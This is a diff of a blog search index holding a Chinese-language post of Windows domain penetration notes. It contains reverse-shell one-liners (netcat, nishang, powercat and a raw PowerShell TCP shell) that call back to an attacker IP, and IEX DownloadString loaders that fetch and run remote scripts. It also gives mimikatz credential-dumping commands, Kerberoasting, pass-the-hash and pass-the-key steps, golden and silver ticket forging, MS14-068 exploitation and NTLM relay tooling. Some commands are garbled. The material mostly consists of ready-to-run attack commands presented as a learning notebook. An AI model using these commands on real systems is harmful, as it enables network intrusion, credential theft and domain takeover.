-<pre><code class="cmd">mimikatz # kerberos::golden /user:administrator /doamin::dog.org /sid:[SID] /krbigi:[NTLM]</code></pre>
-</li>
-<li><p>使用mimikatz将凭证注入进去</p>
-<pre><code class="cmd">mimikatz # kerberos::ptt ticket.kirbi</code></pre>
-</li>
-<li><p>如果主机开启了RPC服务，还可以使用WmiExec.vbs直接连接：</p>
-<pre><code class="cmd">cscript &quot;wmiexe v1.1.vbs&quot; /shell 192.168.3.21</code></pre>
-</li>
-</ol>
-<h4 id="Silver-ticket"><a href="#Silver-ticket" class="headerlink" title="Silver ticket"></a>Silver ticket</h4><p>silver ticket和golden ticket不同的是,它不需要和域控制器进行通信，原理是伪造TGS，使用的是计算机账户的hash进行加密的，所以只能访问指定的权限。</p>
-<p><strong>利用步骤</strong></p>
-<ol>
-<li><p>首先登录域控，dump机器hash</p>
-<pre><code class="cmd">mimikatz # privilege::debug
-mimikatz # sekurlsa::logonpasswords</code></pre>
-</li>
-<li><p>将hash保存下来，在普通域用户机器中进行ptt</p>
-<pre><code class="cmd">mimikatz # kerberos::golden /domain:god.org /sid:[SID]  /target:192.168.3.21 /rc4:[NTLM]  /service:cifs /user:mary /ptt</code></pre>
-<blockquote>
-<p>这里的cifs是指的文件共享服务，有了cifs服务权限，就可以访问域控制器的文件系统</p>
-</blockquote>
-</li>
-</ol>
-<h3 id="Ptk（Pass-the-key）"><a href="#Ptk（Pass-the-key）" class="headerlink" title="Ptk（Pass the key）"></a>Ptk（Pass the key）</h3><h4 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h4><p>由于在进行认证的时候，是用用户hash加密时间戳，即使在使用密码进行登录的情况下，也是先把密码加密成hash，再进行认证。因此在只有用户hash，没有明文密码的情况下也是可以进行认证的。不管是rubeus还是impacket里面的相关脚本都是支持直接使用hash进行认证。其中，如果hash的ntlm hash，然后加密方式是rc4，这种就算做是pass the hash，如果是hash是aes key（使用sekurlsa::ekeys导出来），就算是pass the key。在很多地方，不支持rc4加密方式的时候，使用pass the key不失为一种好方法。</p>
-<h4 id="注入方法"><a href="#注入方法" class="headerlink" title="注入方法"></a>注入方法</h4><ol>
-<li><p>获取用户的aes key</p>
-<pre><code class="cmd">mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::ekeys&quot;</code></pre>
-</li>
-<li><p>注入aes key</p>
-<pre><code class="cmd">mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:mary /domain:god.org /aes256:[aes256_hmac]&quot; </code></pre>
-</li>
-</ol>
-<blockquote>
-<p>如果拒绝访问的话尝试安装kb2871997补丁</p>
-</blockquote>
-<h3 id="NTLM-Relay"><a href="#NTLM-Relay" class="headerlink" title="NTLM Relay"></a>NTLM Relay</h3><blockquote>
-<p>NTLM(v1/v2)的hash是存放在安全账户管理(SAM)数据库以及域控的NTDS.dit数据库中，获取该Hash值可以直接进行PtH攻击。</p>
-<p>Net-NTLM(v1/v2)的hash值是基于用户的NT的hash值经过一定的算法产生的。</p>
-<p>区别：</p>
-<p>Net-NTLM v1 hash相对容易破解，拿到就约等于拿到了NTLM hash</p>
-<p>Net-NTLM v2 hash需要暴力破解（hashcat）</p>
-</blockquote>
-<h4 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h4><p>在使用一些服务的过程中，需要带有windows的自身的认证信息，其实就是Net-NTLM的Hash，而这些东西你可以使用像Responder或者Inveigh这些工具获得。然后你获取了这个Net-NTLM的Hash，就可以转给真正的验证服务器去验证，从而作为攻击者的你就可以通过真实的服务器的身份验证，这种攻击方式就称作NTLM中继攻击。</p>
-<h4 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h4><ul>
-<li>Responder：<a href="https://github.com/SpiderLabs/Responder" target="_blank" rel="noopener">https://github.com/SpiderLabs/Responder</a></li>
-<li>Inveigh：<a href="https://github.com/Kevin-Robertson/Inveigh" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Inveigh</a></li>
-<li>smbrealyx：<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbrelayx.py" target="_blank" rel="noopener">https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbrelayx.py</a></li>
-</ul>
-<p>参考链接：</p>
-<p><a href="https://www.anquanke.com/post/id/99793" target="_blank" rel="noopener">powershell反弹shell常见方式</a></p>
-<p><a href="https://www.anquanke.com/post/id/171552#h2-6" target="_blank" rel="noopener">Kerberos协议探索系列之扫描与爆破篇</a></p>
-<p><a href="https://3gstudent.github.io/域渗透-Kerberoasting/" target="_blank" rel="noopener">域渗透——Kerberoasting</a></p>
-<p><a href="https://www.cnblogs.com/bmjoker/p/10355979.html" target="_blank" rel="noopener">内网渗透之PTH&amp;PTT&amp;PTK</a></p>
-]]></content>
-      <tags>
-        <tag>WEB</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sqli-labs</title>
     <url>/2020/02/28/sqli-labs/</url>
     <content><![CDATA[<blockquote>
@@ -5726,6 +5572,349 @@ http://127.0.0.1/sqli-labs-master/Less-46/?sort=1 and If(ascii(substr(database()
 所以只能进行时间盲注</code></pre>]]></content>
       <tags>
         <tag>PRACTICE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>内网渗透——Kerberos篇（待更新）</title>
+    <url>/2020/05/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Kerberos%E7%AF%87%EF%BC%88%E5%BE%85%E6%9B%B4%E6%96%B0%EF%BC%89/</url>
+    <content><![CDATA[<p>对内网渗透一些东西的小记录</p>
+<a id="more"></a>
+
+<h2 id="WinXP配置PowerShell"><a href="#WinXP配置PowerShell" class="headerlink" title="WinXP配置PowerShell"></a>WinXP配置PowerShell</h2><ol>
+<li><p>安装.NET Framework 2.0 Service Pack 2</p>
+<p><a href="https://www.microsoft.com/zh-cn/download/confirmation.aspx?id=1639" target="_blank" rel="noopener">https://www.microsoft.com/zh-cn/download/confirmation.aspx?id=1639</a></p>
+</li>
+<li><p>安装WindowsXP-KB926140-v5-x86-CHS.exe</p>
+<p><a href="https://download.cnet.com/Microsoft-Windows-PowerShell-1-0-for-Windows-XP/3000-2070_4-75450849.html" target="_blank" rel="noopener">https://download.cnet.com/Microsoft-Windows-PowerShell-1-0-for-Windows-XP/3000-2070_4-75450849.html</a></p>
+</li>
+</ol>
+<h2 id="Windows反弹shell"><a href="#Windows反弹shell" class="headerlink" title="Windows反弹shell"></a>Windows反弹shell</h2><h3 id="nc反弹shell"><a href="#nc反弹shell" class="headerlink" title="nc反弹shell"></a>nc反弹shell</h3><pre><code class="cmd"># Attacker
+nc -vlp 9999
+
+# Victim
+nc.exe 192.168.255.128 9999 -e c:\WINDOWS\system32\cmd.exe</code></pre>
+<h3 id="powercat"><a href="#powercat" class="headerlink" title="powercat"></a>powercat</h3><p><a href="https://github.com/besimorhino/powercat" target="_blank" rel="noopener">https://github.com/besimorhino/powercat</a> </p>
+<pre><code class="cmd"># Attacker
+nc -lvp 6666 或 powercat -l -p 6666
+
+# Victim
+powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;);
+powercat -c 192.168.255.128 -p 6666 -e cmd</code></pre>
+<h3 id="nishang"><a href="#nishang" class="headerlink" title="nishang"></a>nishang</h3><p><a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">https://github.com/samratashok/nishang</a></p>
+<h3 id="Reverse-TCP-Shell"><a href="#Reverse-TCP-Shell" class="headerlink" title="Reverse TCP Shell"></a>Reverse TCP Shell</h3><pre><code class="cmd"># Attacker
+nc -lvp 6666
+
+# Victim
+powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.255.128 -port 6666
+或
+powershell IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.255.128/nishang/Shells/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.255.128 -port 6666</code></pre>
+<h3 id="Reverse-UDP-Shell"><a href="#Reverse-UDP-Shell" class="headerlink" title="Reverse UDP Shell"></a>Reverse UDP Shell</h3><pre><code class="cmd"># Attacker
+nc -lvup 53
+
+# Victim
+powershell IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.159.134/nishang/Shells/Invoke-PowerShellUdp.ps1&#39;);Invoke-PowerShellUdp -Reverse -IPAddress 192.168.255.128 -port 53</code></pre>
+<h3 id="Reverse-ICMP-shell"><a href="#Reverse-ICMP-shell" class="headerlink" title="Reverse ICMP shell"></a>Reverse ICMP shell</h3><p>icmpsh_m.py：<a href="https://github.com/inquisb/icmpsh" target="_blank" rel="noopener">https://github.com/inquisb/icmpsh</a></p>
+<pre><code class="cmd"># Attacker
+sysctl -w net.ipv4.icmp_echo_ignore_all=1 #忽略所有icmp包
+python icmpsh_m.py 192.168.255.128 192.168.255.130 #开启监听
+
+# Victim
+powershell IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.255.128/nishang/Shells/Invoke-PowerShellIcmp.ps1&#39;);Invoke-PowerShellIcmp -IPAddress 192.168.255.130</code></pre>
+<h3 id="自定义payload"><a href="#自定义payload" class="headerlink" title="自定义payload"></a>自定义payload</h3><pre><code class="cmd"># Attacker
+nc -lvp 6666
+
+# Victim
+powershell -nop -c &quot;$client = New-Object Net.Sockets.TCPClient(&#39;192.168.255.128&#39;,6666);$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
+$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );
+$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;</code></pre>
+<h3 id="Reverse-DNS-Shell"><a href="#Reverse-DNS-Shell" class="headerlink" title="Reverse DNS Shell"></a>Reverse DNS Shell</h3><p>dnscat2：<a href="https://github.com/iagox86/dnscat2" target="_blank" rel="noopener">https://github.com/iagox86/dnscat2</a> </p>
+<pre><code class="cmd"># Attacker
+ruby dnscat2.rb --dns &quot;domain=lltest.com,host=192.168.255.128&quot; --no-cache -e open
+
+# Victim
+powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1&#39;);Start-Dnscat2 -Domain lltest.com -DNSServer 192.168.255.128</code></pre>
+<h3 id="DLL注入"><a href="#DLL注入" class="headerlink" title="DLL注入"></a>DLL注入</h3><p>PowerSploit：<a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit</a></p>
+<pre><code class="cmd"># Attacker
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.255.128 lport=6667 -f dll -o /var/www/html/PowerSploit/lltest.dll
+
+# Victim
+Get-Process #选择要注入的进程 Id
+IEX (New-Object Net.WebClient).DownloadString(&quot;http://192.168.255.128/PowerSploit/CodeExecution/Invoke-DllInjection.ps1&quot;)
+Invoke-DllInjection -ProcessID 5816 -Dll C:UsersAdministratorDesktoplltest.dll</code></pre>
+<h3 id="MSF-Reverse-Shell"><a href="#MSF-Reverse-Shell" class="headerlink" title="MSF Reverse Shell"></a>MSF Reverse Shell</h3><pre><code class="cmd"># Attacker
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.255.128 LPORT=4444 -f exe -o tcpshell.exe
+
+# Victim
+tcpshell.exe</code></pre>
+<h2 id="信息收集（简）"><a href="#信息收集（简）" class="headerlink" title="信息收集（简）"></a>信息收集（简）</h2><pre><code class="cmd">ipconfig /all    
+# 查询本机IP段，所在域等
+net config Workstation    
+# 当前计算机名，全名，用户名，系统版本，工作站域，登陆域
+net user    
+# 本机用户列表
+net localgroup administrators    
+# 本机管理员[通常含有域用户]
+net user /domain    
+# 查询域用户
+net user 用户名 /domain    
+# 获取指定用户的账户信息
+net user /domain b404 pass    
+# 修改域内用户密码，需要管理员权限
+net group /domain    
+# 查询域里面的工作组
+net group 组名 /domain    
+# 查询域中的某工作组
+net group &quot;domain admins&quot; /domain    
+# 查询域管理员列表
+net group &quot;domain controllers&quot; /domain    
+# 查看域控制器(如果有多台)
+net time /domain    
+# 判断主域，主域服务器都做时间服务器
+ipconfig /all    
+# 查询本机IP段，所在域等</code></pre>
+<h2 id="Kereros-协议（简）"><a href="#Kereros-协议（简）" class="headerlink" title="Kereros 协议（简）"></a>Kereros 协议（简）</h2><ul>
+<li>客户机将明文密码进行NTLM哈希，然后和时间戳一起加密（使用KRBTGT密码hash作为密钥），发送给KDC（域控），KDC对用户进行检测，成功之后创建TGT（票据授权票据）</li>
+<li>将TGT进行加密签名返回给客户机器，只有域用户KRBTGT才能读取Kerberos中TGT数据</li>
+<li>然后客户机将TGT发送给KDC请求TGS（票证授权服务）票证，并且对TGT进行检测</li>
+<li>检测成功之后，将目标服务账户的NTLM以及TGT进行加密，将加密后的结果返回给客户机。</li>
+</ul>
+<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><h3 id="Kerberoating"><a href="#Kerberoating" class="headerlink" title="Kerberoating"></a>Kerberoating</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>域内的任何一台主机，都能够通过查询SPN，向域内的所有服务请求TGS，拿到TGS后对其进行暴力破解。对于破解出的明文口令，只有域用户帐户(Users)的口令存在价值，不必考虑机器帐户的口令（无法用于远程连接）。</p>
+<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><ol>
+<li>查询SPN，找到有价值的SPN，需要满足以下条件：<ul>
+<li>该SPN注册在域用户帐户(Users)下</li>
+<li>域用户账户的权限很高</li>
+</ul>
+</li>
+<li>请求TGS</li>
+<li>导出TGS</li>
+<li>暴力破解</li>
+</ol>
+<h4 id="手工导出"><a href="#手工导出" class="headerlink" title="手工导出"></a>手工导出</h4><ol>
+<li><p>获取有价值的SPN</p>
+<ol>
+<li><p>使用powershell模块Active Directory</p>
+<blockquote>
+<p>powershell模块Active Directory 需要提前安装，域控制器一般会安装</p>
+<p>导入命令：</p>
+<p>import-module .\Microsoft.ActiveDirectory.Management.dll</p>
+<p>下载地址：</p>
+<p><a href="https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll" target="_blank" rel="noopener">https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll</a></p>
+</blockquote>
+<pre><code class="cmd">import-module ActiveDirectory
+get-aduser -filter {AdminCount -eq 1 -and (servicePrincipalName -ne 0)} -prop * |select name,whencreated,pwdlastset,lastlogon</code></pre>
+</li>
+<li><p>使用PowerView</p>
+<p>脚本地址：</p>
+<p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p>
+<pre><code class="cmd">Get-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,lastlogon</code></pre>
+</li>
+<li><p>使用kerberoast</p>
+<p>脚本地址：</p>
+<p>（powershell）<a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1</a></p>
+<p>（vbs）<a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs</a></p>
+<pre><code class="cmd">cscript GetUserSPNs.vbs</code></pre>
+</li>
+</ol>
+</li>
+<li><p>请求TGS，执行后输入<code>klist</code>查看内存中的票据，可找到获得的TGS。</p>
+<ol>
+<li><p>请求指定TGS</p>
+<pre><code class="cmd">$SPNName = &#39;MSSQLSvc/DC1.test.com&#39;
+Add-Type -AssemblyNAme System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName</code></pre>
+</li>
+<li><p>请求所有TGS</p>
+<pre><code class="cmd">Add-Type -AssemblyName System.IdentityModel  
+setspn.exe -q */* | Select-String &#39;^CN&#39; -Context 0,1 | % { New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  </code></pre>
+</li>
+</ol>
+</li>
+<li><p>导出TGS</p>
+<pre><code class="cmd">mimikatz # kerberos::list /export</code></pre>
+</li>
+<li><p>破解</p>
+<p>脚本地址：</p>
+<p><a href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py</a></p>
+<pre><code class="cmd">./tgsrepcrack.py wordlist.txt test.kirbi</code></pre>
+</li>
+</ol>
+<h4 id="自动化脚本"><a href="#自动化脚本" class="headerlink" title="自动化脚本"></a>自动化脚本</h4><p>自动实现，并且不需要mimikatz，普通用户权限即可</p>
+<p>参考资料：</p>
+<p><a href="http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/" target="_blank" rel="noopener">http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/</a></p>
+<p>代码地址：</p>
+<p><a href="http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/" target="_blank" rel="noopener">http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/</a></p>
+<p><strong>利用步骤</strong></p>
+<ol>
+<li><p>在域内一台主机上以普通用户权限执行</p>
+<pre><code class="cmd">Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | fl</code></pre>
+</li>
+<li><p>只提取hash参数</p>
+<pre><code class="cmd">Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation</code></pre>
+</li>
+<li><p>使用hashcat破解</p>
+<pre><code class="cmd">hashcat -m 13100 /tmp/hash.txt /tmp/password.list -o found.txt --force</code></pre>
+</li>
+</ol>
+<h3 id="Pth（Pass-the-hash）"><a href="#Pth（Pass-the-hash）" class="headerlink" title="Pth（Pass the hash）"></a>Pth（Pass the hash）</h3><p>直接通过LM Hash和NTLM Hash访问远程主机或服务，而不用提供明文密码。</p>
+<h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><ul>
+<li>在Windows系统中，通常会使用NTLM身份认证</li>
+<li>NTLM认证不使用明文口令，而是使用口令加密后的hash值，hash值由系统API生成(例如LsaLogonUser)</li>
+<li>hash分为LM hash和NT hash，如果密码长度大于15，那么无法生成LM hash。从Windows Vista和Windows Server 2008开始，微软默认禁用LM hash</li>
+<li>如果攻击者获得了hash，就能够在身份验证的时候模拟该用户(即跳过调用API生成hash的过程)</li>
+</ul>
+<h4 id="适用范围"><a href="#适用范围" class="headerlink" title="适用范围"></a>适用范围</h4><ul>
+<li>域/工作组环境</li>
+<li>可以获得hash，但是条件不允许对hash爆破</li>
+<li>内网中存在和当前机器相同的密码</li>
+</ul>
+<blockquote>
+<p>微软对 Pth 打过补丁，但是默认的 Administrator(SID 500) 账号还可以使用 Pth。</p>
+<p>如果禁用了 ntlm 认证，PsExec 无法利用获得的 ntlm hash 进行远程连接，但是使用 mimikatz 还是可以攻击成功。</p>
+</blockquote>
+<h4 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><blockquote>
+<p>mimikatz的pth功能需要本地管理员权限，这是由它的实现机制决定的，需要先获得高权限进程lsass.exe的信息</p>
+<p>对于8.1/2012r2，安装补丁kb2871997的Win 7/2008r2/8/2012，可以使用AES keys代替NT hash</p>
+</blockquote>
+<p>获取 hash</p>
+<pre><code class="cmd">mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords</code></pre>
+<p>pth</p>
+<pre><code class="cmd">mimikatz # sekurlsa::pth /user:[Username] /domain:workgroup /ntlm:[NTLM]</code></pre>
+<h4 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h4><p><strong>Invoke-TheHash</strong></p>
+<p><a href="https://github.com/Kevin-Robertson/Invoke-TheHash" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Invoke-TheHash</a></p>
+<pre><code class="cmd">Invoke-Module Invoke-TheHash.psd1Invoke-WMIExec -Target 192.168.3.21 -Domain workgroup -Username administrator -Hash ccef208c6485269c20db2cad21734fe7 -Command &quot;calc.exe&quot; -verbose</code></pre>
+<p><strong>Invoke-SMBExec</strong></p>
+<blockquote>
+<p>支持SMB1，SMB2 (2.1)，and SMB signing，</p>
+</blockquote>
+<pre><code class="cmd">Invoke-SMBExec -Target 192.168.3.21 -Domain test.local -Username test1 -Hash ccef208c6485269c20db2cad21734fe7 -Command &quot;calc.exe&quot; -verbose</code></pre>
+<p><strong>Invoke-SMBClient</strong></p>
+<blockquote>
+<p>支持SMB1, SMB2 (2.1), and SMB signing，如果只有SMB文件共享的权限，没有远程执行权限，可以使用该脚本。</p>
+<p>支持的功能包括列举目录、上传文件、下载文件、删除文件(具体权限取决于该口令hash的权限)</p>
+</blockquote>
+<p><strong>wmiexec.py</strong></p>
+<p><a href="https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py" target="_blank" rel="noopener">https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py</a></p>
+<p><strong>wmiexec.exe</strong></p>
+<p><a href="https://github.com/maaaaz/impacket-examples-windows" target="_blank" rel="noopener">https://github.com/maaaaz/impacket-examples-windows</a></p>
+<blockquote>
+<p>wmiexec.exe通过python impacket库实现的，生成的exe有点大，5M大小在实战起来有点不方便</p>
+</blockquote>
+<pre><code class="cmd">wmiexec -hashes 00000000000000000000000000000000:ccef208c6485269c20db2cad21734fe7 workgroup/administrator@192.168.3.21 &quot;whoami&quot;</code></pre>
+<blockquote>
+<p>wmiexec.py的hash参数格式为 LM Hash:NT Hash ，由于该Hash来自于Server 2008，系统默认不支持LM hash，所以LM hash可以设定为任意值</p>
+</blockquote>
+<h3 id="Ptt（Pass-the-ticket）"><a href="#Ptt（Pass-the-ticket）" class="headerlink" title="Ptt（Pass the ticket）"></a>Ptt（Pass the ticket）</h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>如果我们能够拿到用户的TGT，并将其导入到内存，就可以冒充该用户获得其访问权限。</p>
+<p>利用Kerberos协议进行攻击，三种常用的攻击方法是MS16-068，Golden ticket，Silver ticket。</p>
+<h4 id="MS16-068"><a href="#MS16-068" class="headerlink" title="MS16-068"></a>MS16-068</h4><p>MS14-068是密钥分发中心（KDC）服务中的Windows漏洞。它允许经过身份验证的用户在其Kerberos票证（TGT）中插入任意PAC（表示所有用户权限的结构）。该漏洞位于kdcsvc.dll域控制器的密钥分发中心（KDC）中。用户可以通过呈现具有改变的PAC的Kerberos TGT来获得票证.</p>
+<blockquote>
+<p>ms14-068详细介绍：<a href="https://www.freebuf.com/vuls/56081.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/56081.html</a></p>
+<p>微软给出的补丁是kb3011780</p>
+</blockquote>
+<p>简单来说就是：</p>
+<p>windows域中使用kerberos协议过程中，为了让SS服务器判断Client是否有权限访问服务，引入了PAC机制。构造PAC也是这个漏洞的根本。</p>
+<ol>
+<li>在请求AS时，将require_PAC设置成False。</li>
+<li>在请求TGS时，构造PAC，然后使用MD5签名（PAC尾部的签名算法可以任意指定），PAC并没有放在TGT中发送，而是在请求包的其他位置（但是还是可以解析）。</li>
+<li>TGS_REP返回的不是会话密钥，而是返回的带PAC的TGT。</li>
+</ol>
+<p><strong>利用工具</strong></p>
+<p><a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068" target="_blank" rel="noopener">ms14-068</a></p>
+<p><strong>利用步骤</strong></p>
+<ol>
+<li><p>使用 whoami/user 得到普通域用户的sid</p>
+</li>
+<li><p>执行payload生成TGT票据（.ccache文件）</p>
+<pre><code>ms14-068.exe -u 域成员名@域名 -s 域成员sid -d 域控制器地址 -p 域成员密码</code></pre></li>
+<li><p>票据注入，使用mimikatz将票据注入到当前内存中，伪造凭证，如果成功则拥有域管理权限，可任意访问域中所有机器，成功后会显示<code>Injecting ticket : OK</code></p>
+<pre><code class="cmd">mimikatz # kerberos::purge         //清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造
+mimikatz # kerberos::list          //查看当前机器凭证
+mimikatz # kerberos::ptc 票据文件   //将票据注入到内存中</code></pre>
+</li>
+</ol>
+<p><strong>利用工具</strong> </p>
+<p><a href="https://github.com/gentilkiwi/kekeo/releases" target="_blank" rel="noopener">kekeo</a></p>
+<p><strong>利用步骤</strong></p>
+<ol>
+<li><p>生成票据</p>
+<pre><code class="cmd">kekeo # &quot;tgt::ask /user:mary /domain:god.org /ntlm:518b98ad4178a53695dc997aa02d455c&quot;</code></pre>
+</li>
+<li><p>导入票据</p>
+<pre><code class="cmd">kekeo # &quot;kerberos::ptt TGT_mary@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi&quot;</code></pre>
+</li>
+</ol>
+<h4 id="Golden-ticket"><a href="#Golden-ticket" class="headerlink" title="Golden ticket"></a>Golden ticket</h4><p><strong>前提条件</strong></p>
+<ul>
+<li>krbtgt用户的hash(就意味着你已经有域控制器权限了)</li>
+<li>域名称</li>
+<li>域的SID值</li>
+<li>要伪造的用户名</li>
+</ul>
+<p><strong>利用步骤</strong></p>
+<ol>
+<li><p>先登录域控制器，dump krbtgt用户的hash值,获取域sid</p>
+<pre><code class="cmd">mimikatz # privilege::debug
+mimikatz # lsadump::lsa /patch</code></pre>
+</li>
+<li><p>切换到普通域用户的机器，生成TGT凭证,用户名为administrator</p>
+<pre><code class="cmd">mimikatz # kerberos::golden /user:administrator /doamin::dog.org /sid:[SID] /krbigi:[NTLM]</code></pre>
+</li>
+<li><p>使用mimikatz将凭证注入进去</p>
+<pre><code class="cmd">mimikatz # kerberos::ptt ticket.kirbi</code></pre>
+</li>
+<li><p>如果主机开启了RPC服务，还可以使用WmiExec.vbs直接连接：</p>
+<pre><code class="cmd">cscript &quot;wmiexe v1.1.vbs&quot; /shell 192.168.3.21</code></pre>
+</li>
+</ol>
+<h4 id="Silver-ticket"><a href="#Silver-ticket" class="headerlink" title="Silver ticket"></a>Silver ticket</h4><p>silver ticket和golden ticket不同的是,它不需要和域控制器进行通信，原理是伪造TGS，使用的是计算机账户的hash进行加密的，所以只能访问指定的权限。</p>
+<p><strong>利用步骤</strong></p>
+<ol>
+<li><p>首先登录域控，dump机器hash</p>
+<pre><code class="cmd">mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords</code></pre>
+</li>
+<li><p>将hash保存下来，在普通域用户机器中进行ptt</p>
+<pre><code class="cmd">mimikatz # kerberos::golden /domain:god.org /sid:[SID]  /target:192.168.3.21 /rc4:[NTLM]  /service:cifs /user:mary /ptt</code></pre>
+<blockquote>
+<p>这里的cifs是指的文件共享服务，有了cifs服务权限，就可以访问域控制器的文件系统</p>
+</blockquote>
+</li>
+</ol>
+<h3 id="Ptk（Pass-the-key）"><a href="#Ptk（Pass-the-key）" class="headerlink" title="Ptk（Pass the key）"></a>Ptk（Pass the key）</h3><h4 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h4><p>由于在进行认证的时候，是用用户hash加密时间戳，即使在使用密码进行登录的情况下，也是先把密码加密成hash，再进行认证。因此在只有用户hash，没有明文密码的情况下也是可以进行认证的。不管是rubeus还是impacket里面的相关脚本都是支持直接使用hash进行认证。其中，如果hash的ntlm hash，然后加密方式是rc4，这种就算做是pass the hash，如果是hash是aes key（使用sekurlsa::ekeys导出来），就算是pass the key。在很多地方，不支持rc4加密方式的时候，使用pass the key不失为一种好方法。</p>
+<h4 id="注入方法"><a href="#注入方法" class="headerlink" title="注入方法"></a>注入方法</h4><ol>
+<li><p>获取用户的aes key</p>
+<pre><code class="cmd">mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::ekeys&quot;</code></pre>
+</li>
+<li><p>注入aes key</p>
+<pre><code class="cmd">mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:mary /domain:god.org /aes256:[aes256_hmac]&quot; </code></pre>
+</li>
+</ol>
+<blockquote>
+<p>如果拒绝访问的话尝试安装kb2871997补丁</p>
+</blockquote>
+<h3 id="NTLM-Relay"><a href="#NTLM-Relay" class="headerlink" title="NTLM Relay"></a>NTLM Relay</h3><blockquote>
+<p>NTLM(v1/v2)的hash是存放在安全账户管理(SAM)数据库以及域控的NTDS.dit数据库中，获取该Hash值可以直接进行PtH攻击。</p>
+<p>Net-NTLM(v1/v2)的hash值是基于用户的NT的hash值经过一定的算法产生的。</p>
+<p>区别：</p>
+<p>Net-NTLM v1 hash相对容易破解，拿到就约等于拿到了NTLM hash</p>
+<p>Net-NTLM v2 hash需要暴力破解（hashcat）</p>
+</blockquote>
+<h4 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h4><p>在使用一些服务的过程中，需要带有windows的自身的认证信息，其实就是Net-NTLM的Hash，而这些东西你可以使用像Responder或者Inveigh这些工具获得。然后你获取了这个Net-NTLM的Hash，就可以转给真正的验证服务器去验证，从而作为攻击者的你就可以通过真实的服务器的身份验证，这种攻击方式就称作NTLM中继攻击。</p>
+<h4 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h4><ul>
